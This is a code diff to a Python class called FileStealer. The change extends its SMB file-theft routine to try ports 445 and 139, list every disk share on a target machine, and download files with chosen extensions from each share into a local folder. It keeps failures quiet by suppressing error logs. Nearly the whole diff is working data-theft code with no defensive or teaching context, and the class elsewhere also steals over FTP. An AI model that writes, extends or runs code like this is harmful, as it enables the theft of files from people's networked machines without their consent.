@@ -121,13 +121,23 @@ class FileStealer:
         """
 
         conn = SMBConnection(username, password, "local_machine", "remote_machine", use_ntlm_v2=True)
+        connected = False
         try:
-            if conn.connect(target_ip, 139):
-                self.scan_and_steal_smb(conn, target_ip, directories, file_extensions)
+            if conn.connect(target_ip, 445) or conn.connect(target_ip, 139):
+                connected = True
+        except Exception:
+            pass
+
+        if connected:
+            try:
+                shares = [share.name for share in conn.listShares() if share.type == 0] # type 0 is DISK_TREE
+                for share_name in shares:
+                    self.scan_and_steal_smb(conn, target_ip, share_name, directories, file_extensions)
                 conn.close()
                 return True
-        except Exception:
-            pass  # Suppress logs for failed attempts
+            except Exception as e:
+                self.logger.log(f"[ERROR] Failed to list shares on {target_ip}: {e}")
+                conn.close()
         return False
 
     def get_os_specific_file_targets(self, os_type):
@@ -254,30 +264,37 @@ class FileStealer:
         except Exception as e:
             self.logger.log(f"[ERROR] FTP file stealing failed for {target_ip}: {e}")
 
-    def scan_and_steal_smb(self, conn, target_ip, directories, file_extensions):
+    def scan_and_steal_smb(self, conn, target_ip, share_name, directories, file_extensions):
         """
         Scan and steal files over SMB.
 
         Parameters:
             conn (SMBConnection): An active SMB client connection to the target.
             target_ip (str): The IP address of the target device.
+            share_name (str): The name of the SMB share to scan.
             directories (list): List of directories to scan on the target.
             file_extensions (list): List of file extensions to target for stealing.
         """
 
         try:
             for directory in directories:
-                self.logger.log(f"[INFO] Scanning directory {directory} on {target_ip} via SMB.")
+                # Typically, relative directories make more sense per share, but we'll try to join it
+                # Directory path might need to be adjusted; if it fails we just log and continue
+                dir_path = directory if not directory.startswith("/") else directory
+                dir_path = dir_path.replace("C:\\", "").replace("\\", "/") # Quick normalization
+                
+                self.logger.log(f"[INFO] Scanning path {dir_path} on {target_ip} (Share: {share_name}).")
                 try:
-                    shared_files = conn.listPath("SHARE", directory)
+                    shared_files = conn.listPath(share_name, f"/{dir_path}")
                     for file in shared_files:
                         file_name = file.filename
                         if any(file_name.endswith(ext) for ext in file_extensions):
-                            local_path = os.path.join(self.output_dir, f"{target_ip}_{file_name}")
-                            self.logger.log(f"[INFO] Downloading {file_name} to {local_path}.")
+                            local_path = os.path.join(self.output_dir, f"{target_ip}_{share_name}_{file_name}")
+                            self.logger.log(f"[INFO] Downloading {file_name} from {share_name} to {local_path}.")
                             with open(local_path, "wb") as f:
-                                conn.retrieveFile("SHARE", f"{directory}/{file_name}", f)
+                                conn.retrieveFile(share_name, f"/{dir_path}/{file_name}", f)
                 except Exception as e:
-                    self.logger.log(f"[ERROR] Failed to list or download files from {directory}: {e}")
+                    # Supress list error for non-existent paths on this share to reduce log noise
+                    pass
         except Exception as e:
-            self.logger.log(f"[ERROR] SMB file stealing failed for {target_ip}: {e}")
+            self.logger.log(f"[ERROR] SMB file stealing failed for {target_ip} on share {share_name}: {e}")
